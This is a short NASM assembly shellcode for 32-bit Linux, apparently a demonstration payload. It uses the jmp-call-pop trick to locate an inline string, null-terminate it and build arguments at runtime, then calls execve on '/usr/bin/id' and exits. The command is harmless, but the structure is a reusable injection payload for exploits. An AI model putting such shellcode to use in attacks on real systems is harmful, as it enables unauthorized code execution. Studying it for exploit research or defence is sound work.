;Tested on Ubuntu 7.04 x86

section .text
    global _start

_start:
    jmp short command

execution:
    pop        esi
    xor        eax, eax
    mov byte   [esi+11], al
    lea        ebx, [esi]
    mov long   [esi+12], ebx
    mov long   [esi+16], eax
    mov byte   al, 0x0b
    mov        ebx, esi
    lea        ecx, [esi+12]
    lea        edx, [esi+16]
    int        0x80

    xor        eax, eax
    inc        eax
    int        0x80

command:
    call   execution
    db     '/usr/bin/idABBBBCCCC'
